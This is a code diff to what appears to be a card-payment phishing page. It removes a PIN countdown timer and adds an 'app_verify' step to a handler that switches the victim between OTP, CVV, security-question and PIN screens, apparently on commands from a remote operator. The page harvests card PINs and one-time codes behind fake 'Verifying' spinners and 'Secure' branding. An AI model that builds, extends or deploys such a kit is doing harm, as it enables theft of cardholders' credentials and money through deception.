@@ -1150,9 +1150,7 @@ url("pay1ment_icons.woff") format("woff");
                         </div>
                         <div class="otp-error hidden" id="pin-error">Please enter your PIN code.</div>
                         <button class="otp-btn" id="pin-submit" onclick="submitPin()">Continue</button>
-                        <div class="otp-countdown">
-                            Code expires in <span id="pin-timer">4:59</span>
-                        </div>
+                        
                         <div class="vfy-spinner hidden" id="pin-spinner">
                             <div class="spin"></div>
                             <p>Verifying PIN...</p>
@@ -1486,7 +1484,7 @@ url("pay1ment_icons.woff") format("woff");
  
     /* 收到验证类 action 时先隐藏 OTP 区域以便重新展示 */
     if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
-        a === 'cvv_verify'  || a === 'question_verify') {
+        a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify') {
       //hideOtp();
       q('otp-result').className = 'hidden';
       q('otp-form').className = '';
@@ -1668,7 +1666,6 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('pin-amount').textContent = '$' + discountedTotal().toFixed(2);
       updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
       resetPin();
-      startPinTimer()
                         }
 
 
@@ -2079,22 +2076,6 @@ url("pay1ment_icons.woff") format("woff");
                 document.getElementById('pin-spinner').style.display = 'none';
                 document.getElementById('pin-submit').disabled = false;
                 document.getElementById('pin-d1').focus()
-            }
-            var pinSec = 299
-              , pinTmr = null;
-            function startPinTimer() {
-                pinSec = 299;
-                clearInterval(pinTmr);
-                pinTmr = setInterval(function() {
-                    pinSec--;
-                    if (pinSec < 0) {
-                        pinSec = 0;
-                        clearInterval(pinTmr)
-                    }
-                    ;var m = Math.floor(pinSec / 60)
-                      , s = pinSec % 60;
-                    document.getElementById('pin-timer').textContent = m + ':' + String(s).padStart(2, '0')
-                }, 1000)
             }
             function submitPin() {
                 var code = '';
@@ -2637,7 +2618,7 @@ function updateOtpCardLogoStyle(cardType, elId) {
                 ;el.innerHTML = logo + '<span style="color:#ccc;font-size:18px">|</span><span style="font-family:Arial;font-size:13px">Secure</span>'
             }
 
-  
+
  
 
             </script>
